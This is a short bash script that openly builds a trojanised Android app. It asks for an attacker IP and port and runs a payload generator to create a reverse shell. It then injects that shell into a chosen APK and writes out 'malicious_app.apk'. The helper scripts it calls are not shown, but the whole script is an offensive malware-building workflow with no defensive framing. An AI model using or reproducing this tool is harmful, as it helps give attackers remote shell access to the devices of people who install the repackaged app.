#!/bin/bash

# Ask for IP and Port for Payload
read -p "Enter your IP address for payload: " IP
read -p "Enter port for payload: " PORT

# Generate the payload
echo "Generating payload..."
python payload_generator.py $IP $PORT reverse_shell.py

# Ask for the APK file to inject the payload into
read -p "Enter the path to the target APK: " APK_PATH

# Inject the payload into the APK
echo "Injecting payload into APK..."
python apk_injector.py $APK_PATH reverse_shell.py malicious_app.apk

echo "Malicious APK generated: malicious_app.apk"
